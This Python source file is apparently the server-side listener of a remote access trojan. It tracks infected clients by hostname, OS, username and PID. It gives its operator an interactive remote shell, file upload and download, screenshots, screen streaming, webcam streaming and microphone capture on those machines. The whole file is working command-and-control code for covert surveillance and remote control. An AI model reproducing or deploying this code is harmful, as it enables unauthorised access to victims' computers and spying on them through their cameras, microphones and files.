import json
import os
import sys
import socket
import threading
from server.data_processor import DataProcessor
from server.media_capture import MediaCapture

class Listener:
    
    def __init__(self,ip,port):

        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.bind((ip,port))
        self.socket.listen(5)
        print(f"[*] Listening on {ip}:{port}")
        self.clients = []

    def accept(self):
        
        while True:

            conn,addr = self.socket.accept()
            data = conn.recv(4096).decode('utf-8')
            info = json.loads(data)
            self.handle_client(conn,addr,info)

    def handle_client(self,conn,addr,info):
        "Handle the clients with clients information"

        sysinfo = info["sysinfo"]
        os = f"{sysinfo[0]} {sysinfo[2]} {sysinfo[4]}"
        hostname = sysinfo[1]
        username = info["user"]
        cwd = info["cwd"]
        pid = info["pid"]

        self.clients.append((conn,f"{addr[0]}:{addr[1]}",hostname,os,username,pid,cwd))

    def media_handler(self,client,name,data,record):
        "Handling the media structure using cmd"

        media = MediaCapture(client,name,data["action"],record=record)

        if data["action"] == "screenshot":

            if record:
                media.record_screenshots()
            else:
                media.screenshot()

        elif data["action"] == "screenshare":
            media.streaming()
            
        elif data["action"] == "webcam":
            media.streaming()

        elif data["action"] == "mic":
            media.mic()
            
        del media

    def process_shell(self,client,name,cwd):

        processer = DataProcessor(client)

        try:

            while True:
                cmd = input(f"\n{cwd}> ")

                if cmd == "back":
                    break

                elif cmd == "exit":
                    print("\n[*] Exiting Program...\n")
                    sys.exit()
                
                elif cmd.startswith("upload"):
                    file = cmd.split(" ", 1)[1].strip()
                    if not os.path.exists(file):
                        print("[!] No file or directory found")
                        continue
                    data = processer.upload_file(file)
                    data = {"type":"shell","cmd":cmd,"data":data}
                
                elif any(item in cmd for item in ['screenshare','screenshot','webcam','mic']):
                    action = cmd.split()[0].strip()
                    record = False
                    print(action)
                    if cmd.startswith("record"):
                        action = action.split("_")[1].strip()
                        record = True
                    
                    data = {"type":"media","action":action,"cmd":cmd}
                    processer.send(data)
                    self.media_handler(client,name,data,record)

                    continue

                else:
                    data = {"type":"shell","cmd":cmd}

                response = processer.sharing_data(data)

                if cmd.startswith("cd "):

                    if response["output"].strip() != cwd:
                        cwd = response["output"].strip()
                        base = os.path.basename(cwd)
                        response["output"] = "\n[+] Directory changed to "+ base

                    else:
                        response["output"] = "\n[-] Directory Not Found"

                elif cmd.startswith("download"):
                        result = processer.download(response["output"])
                        response["output"] = result
                    
                print(response["output"])

        except ConnectionRefusedError:
            client.close()
            print("[-] Disconnected")
            

    def table(self,headers,rows):

        BOLD = "\033[1m"
        RESET = "\033[0m"
        headers = ["Index"] + headers
        col_width = []

        for i in range(len(headers)):
            max_len = len(str(headers[i]))

            for j,row in enumerate(rows):
                cell = row[i-1] if i > 0 else j
                max_len = max(max_len, len(str(cell)))

            col_width.append(max_len+2)
        
        separator = "\t-"+"-".join("-" * w for w in col_width)+"-"
        header_line = "\t|"+"|".join(f"{BOLD}{h.upper():^{col_width[i]}}{RESET}" for i,h in enumerate(headers))+"|"

        print(separator)
        print(header_line)
        print(separator)

        for idx,row in enumerate(rows):
            row_with_index = (idx,) + row
            row_line = "\t|"+"|".join(f"{str(cell):^{col_width[i]}}" for i,cell in enumerate(row_with_index))+"|"
            print(row_line)

        print(separator)

    def main(self):

        accept_thread = threading.Thread(target=self.accept,daemon=True)
        accept_thread.start()

        print("\nType 'help' for available options.\n")

        while True:

            option = input("\n>>")

            if option == "help":
                print("""\n\033[1mThese are the commands to interact with different connected system:\033[0m\n
                sys.info           - List all connected system
                sys.get <index>    - Open interactive shell on specified system
                exit               - Exit programm
                remove <index>     - Disconnect and remove the system""")
            
            elif option == "sys.info":

                rows = []
                headers = ["Address","Hostname","OS","Username","PID"]

                for client in self.clients:

                    soc = client[0]
                    try:
                        soc.send(json.dumps("").encode())

                    except socket.error:
                        self.clients.remove(client)
                        continue

                    rows.append((client[1:-1]))
                self.table(headers,rows)
                
            elif option.startswith("sys.get"):

                index = int(option.split()[1])

                if index < len(self.clients) and index >= 0:
                    client = self.clients[index]
                    self.process_shell(client[0],client[2],client[-1])
                    pass

            elif option.startswith("remove"):

                index = int(option.split()[1])

                if index < len(self.clients) and index >= 0:
                    client = self.clients[index][0]
                    client.send(json.dumps({"type":"exit"}).encode('utf-8'))
                    self.clients.pop(index)

                else:
                    print("Invalid index.")

            elif option == "exit":
                print("[*] Exiting Program...")
                break
            
            else:
                print("\nType 'help' for available options.\n")
